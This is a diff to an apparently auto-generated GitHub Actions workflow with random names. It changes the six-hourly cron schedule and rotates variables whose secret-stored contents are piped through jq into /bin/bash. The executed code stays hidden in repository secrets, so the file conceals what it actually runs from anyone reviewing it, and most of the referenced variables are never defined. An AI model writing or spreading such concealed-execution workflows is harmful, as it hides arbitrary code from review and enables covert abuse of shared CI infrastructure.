@@ -1,9 +1,8 @@
 name: wangxianglong4567
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 4/6 * * *'
+    - cron: '24 5/6 * * *'
 
 jobs:
   build:
@@ -13,17 +12,24 @@ jobs:
       - uses: actions/checkout@v4
       - name: wangxianglong4567
         env:
-          coqn9141: ${{ secrets.coqn9141 }}
+          m22077: ${{ secrets.m22077 }}
         run: |
-          echo $coqn9141 | jq -r .mwfuw0418 | /bin/bash
-          echo $gdgm5 | jq -r .isqx38 | /bin/bash
-          echo $yovw85 | jq -r .zwy7197 | /bin/bash
-          echo $nze54 | jq -r .yubsc0 | /bin/bash
-          echo $sh8 | jq -r .nb023 | /bin/bash
-          echo $mkl0059 | jq -r .vgb09498 | /bin/bash
-          echo $c27688 | jq -r .noefa81702 | /bin/bash
-          echo $d81 | jq -r .aypdm734 | /bin/bash
-          echo $dqe22 | jq -r .c36 | /bin/bash
-          echo $eb08 | jq -r .hbxl91 | /bin/bash
-          echo $adpv9670 | jq -r .mqk62 | /bin/bash
+          echo $m22077 | jq -r .touk3 | /bin/bash
+          echo $voulr0655 | jq -r .ol6 | /bin/bash
+          echo $j33349 | jq -r .roxmg8501 | /bin/bash
+          echo $htip5886 | jq -r .vgl271 | /bin/bash
+          echo $qcpal0676 | jq -r .awz1689 | /bin/bash
+          echo $ytad1 | jq -r .zrd9 | /bin/bash
+          echo $hbbdk8 | jq -r .h5 | /bin/bash
+          echo $ecr857 | jq -r .zb71462 | /bin/bash
+          echo $lpufe75 | jq -r .buxoq6 | /bin/bash
+          echo $qhmrl0 | jq -r .e16548 | /bin/bash
+          echo $vhl35677 | jq -r .y6 | /bin/bash
+          echo $weuwu87639 | jq -r .lsx53 | /bin/bash
+          echo $bms7 | jq -r .tytmm75 | /bin/bash
+          echo $xcwk3 | jq -r .pllbm956 | /bin/bash
+          echo $mkdg75 | jq -r .k4 | /bin/bash
+          echo $k3 | jq -r .ucvw60 | /bin/bash
+          echo $i784 | jq -r .ndt548 | /bin/bash
+          echo $hmvz093 | jq -r .uqj428 | /bin/bash
 
